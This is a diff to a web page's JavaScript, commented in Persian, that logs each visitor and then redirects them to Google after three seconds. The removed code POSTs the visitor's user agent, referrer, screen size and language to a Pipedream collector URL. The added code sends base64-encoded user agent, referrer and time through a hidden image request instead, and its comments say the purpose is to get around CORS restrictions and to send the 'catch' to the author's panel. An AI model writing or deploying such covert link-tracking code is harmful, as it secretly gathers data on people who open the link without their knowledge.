@@ -11,19 +11,18 @@
         // آدرس اختصاصی تو در Pipedream
         const loggerURL = "https://eox6t1ks7dm549j.m.pipedream.net";
 
-        // ارسال اطلاعات شکار به پنل تو
-        fetch(loggerURL, {
-            method: 'POST',
-            mode: 'no-cors', // برای جلوگیری از خطاهای امنیتی مرورگر
-            body: JSON.stringify({
-                ua: navigator.userAgent,
-                ref: document.referrer || "Direct Access",
-                screen: window.screen.width + "x" + window.screen.height,
-                lang: navigator.language
-            })
-        });
+        // استفاده از متد Image برای دور زدن محدودیت‌های CORS و ثبت سریع
+        const img = new Image();
+        const data = btoa(JSON.stringify({
+            ua: navigator.userAgent,
+            ref: document.referrer || "Direct",
+            time: Date.now()
+        }));
+        
+        // ارسال اطلاعات به عنوان یک پارامتر در آدرس عکس
+        img.src = loggerURL + "?data=" + data;
 
-        // انتقال به گوگل بعد از ۳ ثانیه
+        // انتقال به مقصد بعد از ۳ ثانیه
         setTimeout(() => {
             window.location.href = "https://www.google.com";
         }, 3000);
